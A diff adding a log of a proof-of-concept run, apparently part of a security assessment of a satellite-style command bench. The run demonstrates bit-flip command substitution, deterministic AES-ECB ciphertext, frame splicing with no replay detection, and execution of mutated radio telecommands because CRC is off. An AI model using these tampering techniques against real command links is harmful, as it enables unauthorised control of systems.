@@ -1,0 +1,66 @@
+[   0.000] ========================================================================
+[   0.000] V-12 silent TC bit-flip / block swap
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.857] --> TC apid=0x0A via=usb AES  payload=00
+[   8.909] <-- TM apid=0x0A clear len=3
+[   8.950] --> TC apid=0x1D via=usb clear payload=0101
+[   9.002] <-- TM apid=0x1D clear len=4
+[   9.002] --> TC apid=0x11 via=usb clear payload=00
+[   9.463] <-- TM apid=0x11 clear len=9
+[   9.463] --> TC apid=0x15 via=usb clear payload=001005
+[   9.913] <-- TM apid=0x15 clear len=6
+[   9.913] --> TC apid=0x0D via=usb clear payload=01
+[  10.374] <-- TM apid=0x0D clear len=4
+[  10.415] --> TC apid=0x1D via=usb clear payload=03
+[  10.467] <-- TM apid=0x1D clear len=4
+[  10.467] <-- TM apid=0x09 clear len=9
+[  10.519] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.560] <-- TM apid=0x1D clear len=4
+[  10.560] --> TC apid=0x10 via=usb clear payload=00
+[  10.612] <-- TM apid=0x10 clear len=4
+[  10.612] --> TC apid=0x21 via=usb clear payload=00
+[  11.070] <-- TM apid=0x21 clear len=6
+[  11.070] --> TC apid=0x24 via=usb clear payload=0000
+[  11.112] <-- TM apid=0x24 clear len=8
+[  11.112] --> TC apid=0x24 via=usb clear payload=0100
+[  11.163] <-- TM apid=0x24 clear len=8
+[  11.163] --> TC apid=0x24 via=usb clear payload=0200
+[  11.215] <-- TM apid=0x24 clear len=8
+[  11.215] --> TC apid=0x24 via=usb clear payload=0300
+[  11.267] <-- TM apid=0x24 clear len=8
+[  11.267] --> TC apid=0x25 via=usb clear payload=0080
+[  11.319] <-- TM apid=0x25 clear len=4
+[  11.319] --> TC apid=0x1E via=usb clear payload=01
+[  11.831] <-- TM apid=0x1E clear len=5
+[  11.831] --> TC apid=0x1D via=usb clear payload=0b
+[  11.924] <-- TM apid=0x1D clear len=4
+[  11.924] --> TC apid=0x05 via=usb clear payload=12
+[  12.384] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.886] <-- TM apid=0x1F clear len=4
+[  12.886] --> TC apid=0x1F via=usb clear payload=05
+[  13.388] <-- TM apid=0x1F clear len=4
+[  13.388] --> TC apid=0x0A via=usb clear payload=01
+[  13.433] <-- TM apid=0x0A AES len=3
+[  21.524] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.006] <-- TM apid=0x0E AES len=18
+[  30.006] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.119] --> TC apid=0x1D via=radio AES  payload=0a0001
+[  30.171] <-- TM apid=0x1D clear len=4
+[  30.632] <-- TM apid=0x1A clear len=8
+[  30.632] flipped primary-header bit 0: SB_PUBLISH(0x1B) executed as SET_LOG_NAME(0x1A) with the SAME ciphertext -> privilege mixup
+[  30.633] ECB determinism: identical publishes give identical ciphertext blocks -> True
+[  31.083] --> advance(200 ms)
+[  31.331] <-- TM apid=0x27 clear len=4
+[  31.383] --> TC apid=0x1D via=radio AES  payload=00
+[  31.434] <-- TM apid=0x1D clear len=18
+[  31.434] spliced publish: frame built from A's capture -> tilt 4.49 (B's value replayed, no error, no replay detection)
+[  31.888] <-- TM apid=0x09 AES len=17
+[  31.888] one flipped bit -> random reject ['AES DECRYPT FAIL'] -- never an AUTHENTICATED integrity verdict
+[  34.701] --> TC apid=0x20 via=radio AES  payload=-
+[  35.161] <-- TM apid=0x20 clear len=18
+[  35.161] radio CRC disabled by default: mutated TCs execute silently
+[  35.161] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=45 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01B SEQ=5 LEN=32 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=45 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01B SEQ=7 LEN=32 FLAGS=1 SEC_HDR=NO | [ERROR] Secure link payload decrypt failed | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x020 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  35.161] ========================================================================
+[  35.161] POC OK
+[  35.161] ========================================================================
